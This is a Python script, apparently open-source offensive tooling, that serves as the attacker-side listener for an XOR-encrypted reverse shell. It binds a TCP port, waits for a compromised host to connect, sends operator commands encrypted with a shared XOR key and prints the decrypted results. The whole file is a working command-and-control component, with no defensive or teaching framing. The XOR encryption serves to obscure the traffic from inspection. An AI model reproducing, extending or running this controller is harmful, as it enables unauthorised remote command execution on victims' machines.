#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
# Python 3.X.X
# Autors: Xtr3am3r.0k@gmail.com, jerskisnow
# Requirements: pycrypto (https://www.dlitz.net/software/pycrypto/)
import argparse
from socket import socket, AF_INET, SOCK_STREAM
from Crypto.Cipher import XOR

parser = argparse.ArgumentParser(description='XOR Shell - Attacker')
parser.add_argument('-a','--host', help='set lhost', required=True)
parser.add_argument('-p','--port', help='set lport', required=True)
parser.add_argument('-k','--key', help='set XOR key', required=True)
args = vars(parser.parse_args())

host = args['host']
port = int(args['port'])
key = args['key']

print('SERVER IP:', host)
print('SERVER HOST:', port)
print('XOR KEY:', key)

def encrypt(cleardata):
    data = XOR.XORCipher(key)
    return data.encrypt(cleardata)

def decrypt(cleardata):
    data = XOR.XORCipher(key)
    return data.decrypt(cleardata)

def main():
    print('---=(Started listening)=---')
    sockobj = socket(AF_INET, SOCK_STREAM)
    sockobj.bind((host, port))
    sockobj.listen(5)
    while True:
        connection, address = sockobj.accept()
        try:
            print('[#] Have new connection -->', address)
            while True:
                try:
                    cmd = str(input('#input cmd: '))
                    if cmd == 'quit':
                        print('Connection from address {}, closing...'.format(address))
                        connection.close()
                        sockobj.close()

                    if len(str.encode(cmd)) > 0:
                        connection.send(encrypt(cmd.encode()))
                        client_data = (decrypt(connection.recv(1024)))
                        try:
                            # English
                            print(client_data.decode('utf-8', errors='ignore') + '\n')
                        except:
                            # Rusian
                            print(client_data.decode('cp866', errors='ignore') + '\n')
                except:
                    break

        except KeyboardInterrupt:
            print("Interruption received, exiting")
            connection.close()
            sockobj.close()
        except Exception:
            connection.close()
            print('[-] Connection Reset Error: [WinError 10054] for {}'.format(address),
                  '\n\n\n[*] Wait for new Connections')


if __name__ == "__main__":
    main()